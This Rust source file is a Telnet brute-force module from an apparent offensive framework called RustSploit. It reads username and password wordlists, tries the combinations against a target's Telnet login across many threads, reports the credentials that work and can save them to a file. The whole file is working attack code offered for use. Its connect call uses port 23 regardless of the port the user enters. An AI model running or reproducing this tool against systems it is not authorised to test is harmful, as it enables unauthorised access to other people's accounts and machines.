use anyhow::{Result, Context};
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::ToSocketAddrs;
use std::sync::{Arc, Mutex};
use telnet::Event;
use threadpool::ThreadPool;
use crossbeam_channel::{unbounded};
use telnet::Telnet;

pub async fn run_module(target: &str) -> Result<()> {
    println!("\n=== Telnet Bruteforce Module (RustSploit) ===\n");

    let target = target.to_string();
    let port = prompt("Port (default 23): ").parse().unwrap_or(23);
    let username_wordlist = prompt("Username wordlist file: ");
    let password_wordlist = prompt("Password wordlist file: ");
    let threads = prompt("Number of threads (default 8): ").parse().unwrap_or(8);
    let stop_on_success = prompt("Stop on first valid login? (y/n): ").trim().eq_ignore_ascii_case("y");
    let full_combo = prompt("Try every username with every password? (y/n): ").trim().eq_ignore_ascii_case("y");
    let verbose = prompt("Verbose mode? (y/n): ").trim().eq_ignore_ascii_case("y");

    let config = TelnetBruteforceConfig {
        target,
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
    };

    run_telnet_bruteforce(config)
}

#[derive(Clone)]
struct TelnetBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
}

fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    let addr = format!("{}:{}", config.target, config.port);
    let socket_addr = addr
        .to_socket_addrs()
        .context("Invalid target address")?
        .next()
        .context("Unable to resolve target address")?;

    println!("\n[*] Starting Telnet bruteforce on {}", socket_addr);

    let usernames = read_lines(&config.username_wordlist)?;
    let passwords = read_lines(&config.password_wordlist)?;

    let creds = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(Mutex::new(false));
    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();

    if config.full_combo {
        for user in &usernames {
            for pass in &passwords {
                tx.send((user.clone(), pass.clone()))?;
            }
        }
    } else {
        if usernames.len() == 1 {
            for pass in &passwords {
                tx.send((usernames[0].clone(), pass.clone()))?;
            }
        } else if passwords.len() == 1 {
            for user in &usernames {
                tx.send((user.clone(), passwords[0].clone()))?;
            }
        } else {
            println!("[!] Warning: Multiple usernames and passwords loaded, but full_combo is OFF. Trying first username with all passwords.");
            for pass in &passwords {
                tx.send((usernames[0].clone(), pass.clone()))?;
            }
        }
    }

    drop(tx);

    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let creds = Arc::clone(&creds);
        let config = config.clone();

        pool.execute(move || {
            while let Ok((username, password)) = rx.recv() {
                if *stop_flag.lock().unwrap() {
                    break;
                }

                if config.verbose {
                    println!("[*] Trying {}:{}", username, password);
                }

                match try_telnet_login(&addr, &username, &password) {
                    Ok(true) => {
                        println!("[+] Valid credentials: {}:{}", username, password);
                        creds.lock().unwrap().push((username, password));

                        if config.stop_on_success {
                            *stop_flag.lock().unwrap() = true;
                            break;
                        }
                    }
                    Ok(false) => {}
                    Err(e) => {
                        if config.verbose {
                            eprintln!("[!] Error: {}", e);
                        }
                    }
                }
            }
        });
    }

    pool.join();

    let creds = creds.lock().unwrap();
    if creds.is_empty() {
        println!("[-] No valid credentials found.");
    } else {
        println!("\n[+] Found credentials:");
        for (u, p) in creds.iter() {
            println!(" - {}:{}", u, p);
        }

        let save = prompt("\n[?] Save credentials to file? (y/n): ");
        if save.trim().eq_ignore_ascii_case("y") {
            let filename = prompt("Enter filename to save: ");
            if let Err(e) = save_results(&filename, &creds) {
                eprintln!("[!] Failed to save results: {}", e);
            } else {
                println!("[+] Results saved to '{}'", filename);
            }
        }
    }

    Ok(())
}

fn try_telnet_login(addr: &str, username: &str, password: &str) -> Result<bool> {
    let mut connection = Telnet::connect((addr, 23), 256)
        .context("Failed to connect to Telnet server")?;

    let mut login_prompt_seen = false;
    let mut pass_prompt_seen = false;

    for _ in 0..10 {
        let event = connection.read().context("Failed to read from Telnet")?;

        match event {
            Event::Data(buffer) => {
                let output = String::from_utf8_lossy(&buffer).to_lowercase();

                if !login_prompt_seen && (output.contains("login:") || output.contains("username")) {
                    connection.write(format!("{}\n", username).as_bytes())?;
                    login_prompt_seen = true;
                } else if login_prompt_seen && !pass_prompt_seen && output.contains("password") {
                    connection.write(format!("{}\n", password).as_bytes())?;
                    pass_prompt_seen = true;
                } else if pass_prompt_seen {
                    // Look for signs of successful or failed login
                    if output.contains("incorrect")
                        || output.contains("failed")
                        || output.contains("denied")
                    {
                        return Ok(false);
                    } else if output.contains("last login")
                        || output.contains("$")
                        || output.contains("welcome")
                        || output.contains("#")
                    {
                        return Ok(true);
                    }
                }
            }
            _ => {}
        }
    }

    Ok(false)
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).context(format!("Unable to open {}", path))?;
    Ok(BufReader::new(file).lines().filter_map(Result::ok).collect())
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut file = OpenOptions::new().create(true).write(true).truncate(true).open(path)?;
    for (u, p) in creds {
        writeln!(file, "{}:{}", u, p)?;
    }
    Ok(())
}

fn prompt(message: &str) -> String {
    print!("{}", message);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}
